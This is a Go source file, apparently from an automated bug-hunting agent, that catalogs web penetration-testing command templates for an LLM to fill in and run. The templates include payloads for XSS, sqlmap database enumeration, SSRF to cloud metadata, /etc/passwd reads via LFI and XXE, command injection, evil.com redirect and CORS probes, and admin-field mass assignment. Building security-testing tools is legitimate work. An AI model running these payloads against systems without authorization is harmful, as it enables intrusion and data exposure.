// Package hacktricks provides a curated catalog of HackTricks-inspired
// pen testing techniques, each expressed as a set of concrete command
// templates.  The templates use {{TARGET}}, {{HOST}}, {{PATH}}, {{PARAM}}, and
// {{WORDLIST}}
// placeholders that the HackTricksAgent fills in — either through simple string
// substitution or by asking the coding LLM to adapt them to the specific
// finding context before execution.
//
// All command templates use binaries that are on cmdbuilder's approved
// allow-list.  No external dependencies are introduced by this package.
package hacktricks

import (
	"os"
	"path/filepath"
	"strings"
)

// DefaultDirectoryWordlist resolves the directory/content brute-force wordlist
// path used by gobuster/ffuf templates. Resolution order:
//  1. GOBUSTER_WORDLIST env override (explicit operator choice);
//  2. a directory-list inside a vendored SecLists checkout (SECLISTS_DIR or the
//     conventional /usr/share/seclists, /wordlists/seclists locations);
//  3. the historical /usr/share/wordlists/dirb/common.txt fallback.
func DefaultDirectoryWordlist() string {
	if v := strings.TrimSpace(os.Getenv("GOBUSTER_WORDLIST")); v != "" {
		return v
	}
	roots := make([]string, 0, 3)
	if d := strings.TrimSpace(os.Getenv("SECLISTS_DIR")); d != "" {
		roots = append(roots, d)
	}
	roots = append(roots, "/usr/share/seclists", "/wordlists/seclists")
	candidates := []string{
		"Discovery/Web-Content/directory-list-2.3-medium.txt",
		"Discovery/Web-Content/common.txt",
	}
	for _, root := range roots {
		for _, rel := range candidates {
			p := filepath.Join(root, filepath.FromSlash(rel))
			if info, err := os.Stat(p); err == nil && !info.IsDir() {
				return p
			}
		}
	}
	return "/usr/share/wordlists/dirb/common.txt"
}

// CommandTemplate is a single tool invocation pattern.
type CommandTemplate struct {
	// Binary is the executable name, e.g. "sqlmap" or "curl".
	Binary string
	// ArgsTemplate are the command-line arguments, which may contain the
	// placeholder tokens {{TARGET}}, {{HOST}}, {{PATH}}, and {{PARAM}}.
	ArgsTemplate []string
	// Description explains what this command checks.
	Description string
}

// Technique groups one or more CommandTemplates for a specific vulnerability
// class and links back to the relevant HackTricks reference chapter.
type Technique struct {
	// Category is the vulnerability category keyword (lower-case), e.g. "xss".
	Category string
	// HackTricksURL is the canonical HackTricks chapter for the technique.
	HackTricksURL string
	// Description is a short summary of what the technique exercises.
	Description string
	// CommandTemplates is the list of tool invocations for this technique.
	CommandTemplates []CommandTemplate
}

// Substitute replaces the standard placeholder tokens in a template argument
// slice with the supplied concrete values.  Any token left as an empty string
// is replaced with a sensible default.
func Substitute(args []string, target, host, path, param string) []string {
	if host == "" {
		host = target
	}
	if path == "" {
		path = "/"
	}
	if param == "" {
		param = "id"
	}
	out := make([]string, len(args))
	replacer := strings.NewReplacer(
		"{{TARGET}}", target,
		"{{HOST}}", host,
		"{{PATH}}", path,
		"{{PARAM}}", param,
		"{{WORDLIST}}", DefaultDirectoryWordlist(),
	)
	for i, a := range args {
		out[i] = replacer.Replace(a)
	}
	return out
}

// Library returns the full curated catalog.
func Library() []Technique {
	return catalog
}

// ForCategories returns all techniques whose Category contains any of the
// supplied keywords (case-insensitive).  It preserves the catalog order and
// deduplicates matches.
func ForCategories(keywords ...string) []Technique {
	var out []Technique
	seen := map[string]bool{}
	for _, t := range catalog {
		for _, kw := range keywords {
			if strings.Contains(t.Category, strings.ToLower(kw)) {
				if !seen[t.Category] {
					seen[t.Category] = true
					out = append(out, t)
				}
				break
			}
		}
	}
	return out
}

// catalog is the curated set of HackTricks-inspired techniques.
// Each command template uses only binaries on the cmdbuilder allow-list.
var catalog = []Technique{
	// ── XSS ──────────────────────────────────────────────────────────────────
	{
		Category:      "xss",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting",
		Description:   "Cross-Site Scripting detection: reflected and DOM-based.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "dalfox",
				ArgsTemplate: []string{"url", "{{TARGET}}", "--silence", "--no-color"},
				Description:  "dalfox automated XSS scanner",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=<script>alert(1)</script>", "-D", "-", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "Inline reflection check with a basic XSS payload",
			},
		},
	},
	// ── SQL Injection ─────────────────────────────────────────────────────────
	{
		Category:      "sqli",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/sql-injection",
		Description:   "SQL injection enumeration and exploitation via sqlmap.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "sqlmap",
				ArgsTemplate: []string{"-u", "{{TARGET}}?{{PARAM}}=1", "--batch", "--level=2", "--risk=1", "--output-dir=/tmp/auto-bughunter/sqlmap"},
				Description:  "sqlmap at safe risk/level with default parameter",
			},
			{
				Binary:       "sqlmap",
				ArgsTemplate: []string{"-u", "{{TARGET}}?{{PARAM}}=1", "--batch", "--dbs", "--output-dir=/tmp/auto-bughunter/sqlmap"},
				Description:  "sqlmap database enumeration after injection confirmed",
			},
		},
	},
	// ── SSRF ─────────────────────────────────────────────────────────────────
	{
		Category:      "ssrf",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery",
		Description:   "Server-Side Request Forgery probing internal metadata endpoints.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=http://169.254.169.254/latest/meta-data/", "-L", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "SSRF probe to AWS instance metadata endpoint via parameter",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=http://127.0.0.1:80/", "-L", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "SSRF probe to localhost:80",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}", "-H", "X-Forwarded-For: 169.254.169.254", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "SSRF via header injection",
			},
		},
	},
	// ── IDOR ─────────────────────────────────────────────────────────────────
	{
		Category:      "idor",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/idor",
		Description:   "Insecure Direct Object Reference: iterate object IDs to detect broken object-level auth.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=2", "-H", "Accept: application/json", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "IDOR probe: increment object ID by 1",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=0", "-H", "Accept: application/json", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "IDOR probe: try ID=0 (often bypasses auth checks)",
			},
		},
	},
	// ── SSTI ─────────────────────────────────────────────────────────────────
	{
		Category:      "ssti",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection",
		Description:   "Server-Side Template Injection: detect arithmetic evaluation in templates.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}={{7*7}}", "-o", "-"},
				Description:  "SSTI probe: Jinja2/Twig {{7*7}} renders to 49",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=${7*7}", "-o", "-"},
				Description:  "SSTI probe: FreeMarker/Velocity ${7*7} renders to 49",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=<%= 7*7 %>", "-o", "-"},
				Description:  "SSTI probe: ERB <%= 7*7 %> renders to 49",
			},
		},
	},
	// ── Path Traversal / LFI ─────────────────────────────────────────────────
	{
		Category:      "path_traversal",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/file-inclusion",
		Description:   "Path traversal and Local File Inclusion: attempt to read /etc/passwd.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=../../../../etc/passwd", "-o", "-"},
				Description:  "Basic ../../../../etc/passwd LFI probe",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=....//....//....//....//etc/passwd", "-o", "-"},
				Description:  "Dot-dot-slash encoding bypass LFI probe",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}{{PATH}}../../../../etc/passwd", "-o", "-"},
				Description:  "Path-based LFI via URL path segment",
			},
		},
	},
	// ── XXE ──────────────────────────────────────────────────────────────────
	{
		Category:      "xxe",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity",
		Description:   "XML External Entity injection: attempt to read /etc/passwd via OOB or inline XXE.",
		CommandTemplates: []CommandTemplate{
			{
				Binary: "curl",
				ArgsTemplate: []string{
					"-sk", "{{TARGET}}",
					"-X", "POST",
					"-H", "Content-Type: application/xml",
					"-d", `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
					"-o", "-",
				},
				Description: "Inline XXE entity injection to read /etc/passwd",
			},
		},
	},
	// ── Open Redirect ─────────────────────────────────────────────────────────
	{
		Category:      "open_redirect",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/open-redirect",
		Description:   "Open redirect: verify unsafe URL-redirect behaviour in redirect parameters.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=https://evil.com", "-o", "/dev/null", "-w", "%{redirect_url}"},
				Description:  "Check if redirect parameter bounces to evil.com",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=//evil.com", "-o", "/dev/null", "-w", "%{redirect_url}"},
				Description:  "Protocol-relative open redirect probe",
			},
		},
	},
	// ── CORS ─────────────────────────────────────────────────────────────────
	{
		Category:      "cors",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/cors-bypass",
		Description:   "CORS misconfiguration: inject a crafted Origin to check for wildcard or echo-back.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}", "-H", "Origin: https://evil.com", "-D", "-", "-o", "/dev/null"},
				Description:  "CORS check: arbitrary Origin header",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}", "-H", "Origin: null", "-D", "-", "-o", "/dev/null"},
				Description:  "CORS check: null Origin header (sandbox bypass)",
			},
		},
	},
	// ── Command Injection ─────────────────────────────────────────────────────
	{
		Category:      "command_injection",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/command-injection",
		Description:   "OS command injection via parameter injection with sleep-based timing oracle.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=;sleep+5;", "-o", "/dev/null", "-w", "%{time_total}"},
				Description:  "Timing-based command injection probe (sleep 5)",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}?{{PARAM}}=|sleep+5", "-o", "/dev/null", "-w", "%{time_total}"},
				Description:  "Pipe-based command injection timing probe",
			},
		},
	},
	// ── JWT ──────────────────────────────────────────────────────────────────
	{
		Category:      "jwt",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens",
		Description:   "JWT attacks: algorithm confusion (none/RS256→HS256) and weak secret checks.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "python3",
				ArgsTemplate: []string{"/tmp/auto-bughunter/tools/jwt_probe.py", "{{TARGET}}"},
				Description:  "JWT algorithm confusion and weak-secret probe",
			},
		},
	},
	// ── Auth Bypass ──────────────────────────────────────────────────────────
	{
		Category:      "auth_bypass",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/login-bypass",
		Description:   "Authentication bypass via HTTP verb tampering, SQL truncation, and header injection.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}", "-X", "HEAD", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "HTTP verb tampering: HEAD instead of GET",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}", "-H", "X-Original-URL: /admin", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "Auth bypass via X-Original-URL header override",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}", "-H", "X-Forwarded-For: 127.0.0.1", "-o", "/dev/null", "-w", "%{http_code}"},
				Description:  "Auth bypass via spoofed X-Forwarded-For: localhost",
			},
		},
	},
	// ── Mass Assignment ───────────────────────────────────────────────────────
	{
		Category:      "mass_assignment",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/mass-assignment",
		Description:   "Mass assignment: inject hidden fields (role, isAdmin) into POST/PUT bodies.",
		CommandTemplates: []CommandTemplate{
			{
				Binary: "curl",
				ArgsTemplate: []string{
					"-sk", "{{TARGET}}",
					"-X", "POST",
					"-H", "Content-Type: application/json",
					"-d", `{"role":"admin","isAdmin":true,"is_admin":1}`,
					"-o", "/dev/null", "-w", "%{http_code}",
				},
				Description: "Mass assignment: inject admin role fields into POST body",
			},
		},
	},
	// ── Subdomain Takeover ────────────────────────────────────────────────────
	{
		Category:      "subdomain_takeover",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/domain-subdomain-takeover",
		Description:   "Subdomain takeover: enumerate subdomains and check for dangling CNAME records.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "subfinder",
				ArgsTemplate: []string{"-d", "{{HOST}}", "-silent"},
				Description:  "Subdomain enumeration with subfinder",
			},
			{
				Binary:       "httpx",
				ArgsTemplate: []string{"-u", "{{TARGET}}", "-status-code", "-title", "-silent"},
				Description:  "HTTP reachability check to identify dead subdomains",
			},
		},
	},
	// ── Information Disclosure ────────────────────────────────────────────────
	{
		Category:      "information_disclosure",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology",
		Description:   "Sensitive path discovery: backup files, source exposure, debug endpoints.",
		CommandTemplates: []CommandTemplate{
			{
				Binary:       "gobuster",
				ArgsTemplate: []string{"dir", "-u", "{{TARGET}}", "-w", "{{WORDLIST}}", "-t", "20", "-q", "-H", "Host: {{HOST}}"},
				Description:  "Directory brute-force to find backup/admin paths",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}/.git/config", "-o", "-", "-w", "%{http_code}"},
				Description:  "Check for exposed .git/config",
			},
			{
				Binary:       "curl",
				ArgsTemplate: []string{"-sk", "{{TARGET}}/.env", "-o", "-", "-w", "%{http_code}"},
				Description:  "Check for exposed .env file",
			},
		},
	},
	// ── HTTP Request Smuggling ────────────────────────────────────────────────
	{
		Category:      "request_smuggling",
		HackTricksURL: "https://book.hacktricks.xyz/pentesting-web/http-request-smuggling",
		Description:   "HTTP request smuggling: TE.CL and CL.TE desync probes.",
		CommandTemplates: []CommandTemplate{
			{
				Binary: "curl",
				ArgsTemplate: []string{
					"-sk", "{{TARGET}}",
					"-X", "POST",
					"-H", "Content-Length: 6",
					"-H", "Transfer-Encoding: chunked",
					"-d", "0\r\n\r\nX",
					"-o", "/dev/null", "-w", "%{http_code}",
				},
				Description: "CL.TE smuggling probe with minimal chunk body",
			},
		},
	},
}
